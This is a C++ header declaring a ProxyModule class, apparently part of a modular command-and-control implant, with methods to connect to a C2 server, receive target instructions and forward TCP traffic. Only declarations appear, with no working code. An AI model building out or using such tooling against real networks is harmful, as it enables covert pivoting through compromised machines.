#pragma once

#include "IModule.h"
#include <boost/asio.hpp>
#include <nlohmann/json.hpp>
#include <memory>
#include <thread>
#include <string>
#include <vector>

class ProxyModule : public IModule {
public:
    ProxyModule();
    ~ProxyModule();

    std::string get_module_name() const override;
    void execute_module(const nlohmann::json &instructions) override;

private:
    void connect_to_c2();
    void read_connect_instruction();
    void establish_target_connection(const std::string &target_host, uint16_t target_port);
    void start_forwarding(boost::asio::ip::tcp::socket &from, boost::asio::ip::tcp::socket &to);
    void send_binary_target_instruction(const std::string &host, uint16_t port);
    void wait_for_instructions();
    void read_and_forward();

    std::shared_ptr<boost::asio::io_context> m_io_context;
    boost::asio::ip::tcp::socket m_c2_socket;
    boost::asio::ip::tcp::resolver m_resolver;
    boost::asio::streambuf m_c2_buffer;
    std::thread m_worker_thread;

    std::string m_c2_host;
    int m_c2_port;
};

